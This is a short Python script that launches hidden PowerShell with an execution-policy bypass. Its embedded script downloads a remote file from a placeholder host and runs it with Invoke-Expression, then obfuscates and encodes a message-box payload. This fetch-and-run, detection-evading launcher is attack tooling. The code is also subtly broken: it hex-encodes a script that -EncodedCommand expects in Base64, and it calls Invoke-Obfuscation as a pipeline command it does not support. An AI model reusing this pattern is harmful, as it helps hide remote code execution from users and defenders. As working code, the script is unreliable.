# Import required modules
import subprocess
import os

# Define PowerShell command to execute
powershell_command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -EncodedCommand "

# Define PowerShell script to obfuscate
powershell_script = '''
$code = @"
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show('Insert your message here', 'Title', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
"@
Invoke-Expression (New-Object IO.StreamReader((New-Object System.Net.WebClient).OpenRead('http://example.com/Invoke-Obfuscation.ps1'))).ReadToEnd() | Invoke-Obfuscation -ScriptBlock -Encode -HideCode -OutputEncoding Base64 -Command 'Invoke-Expression ($code)'
'''

# Encode PowerShell script
encoded_script = powershell_script.encode('utf-16le')
encoded_script = encoded_script.hex()

# Construct full PowerShell command
full_command = powershell_command + encoded_script

# Execute PowerShell command
subprocess.call(full_command, shell=True)